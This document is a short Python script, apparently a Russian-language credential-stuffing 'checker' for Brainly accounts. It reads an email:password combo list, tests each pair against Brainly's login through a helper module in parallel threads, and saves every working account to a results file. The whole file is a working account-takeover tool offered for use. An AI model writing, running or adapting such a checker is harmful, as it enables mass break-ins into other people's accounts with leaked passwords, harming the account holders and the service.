import brainly_api, time, os, requests
import logging
import argparse
import datetime
from multiprocessing.dummy import Pool

info = 'Checker by _Skill_'
logging.basicConfig(level=logging.INFO)


class Checker(object):
    def __init__(self):
        self.acc_array = []
        self.date = datetime.datetime.now().strftime("%d%m%Y-%H%M%S")
        try:
            self.filename = open('./results/BRAINLY-{}.txt'.format(self.date), 'a')
        except FileNotFoundError:
            os.mkdir('result')
            self.filename = open('./results/BRAINLY-{}.txt'.format(self.date), 'a')


    def load(self, base_path):
        file = open(base_path, 'r').readlines()
        file = [combos.rstrip() for combos in file]
        for lines in file:
            data = lines.split(':')
            self.acc_array.append({'em': data[0],
                                    'pw': data[1]})


    def login(self, acc):
        email = acc['em']
        password = acc['pw']
        result = brainly_api.check(email, password)
        if result != None:
            logging.info('Новый аккаунт')
            self.filename.write(result)


    def main(self, threads):
        self.load(base_path)
        self.threads = threads
        pool = Pool(self.threads)
        for _ in pool.imap_unordered(self.login, self.acc_array):
            pass



if __name__ == '__main__':
    logging.info(info)
    while True:
        try:
            path = input('Выбереите базу --> ')
            threads = int(input('Количество потоков --> '))
            base_path = os.path.abspath(r''.join(path)).replace('\\', '/')
            start = time.time()
            Checker().main(threads)
            logging.info('Закончено за {} сек.\n--------------------'.format(round(time.time() - start, 2)))
        except KeyboardInterrupt:
            logging.info('Остановлено')
            input()
            os._exit(1)
        except:
            logging.error('Что-то пошло не так')
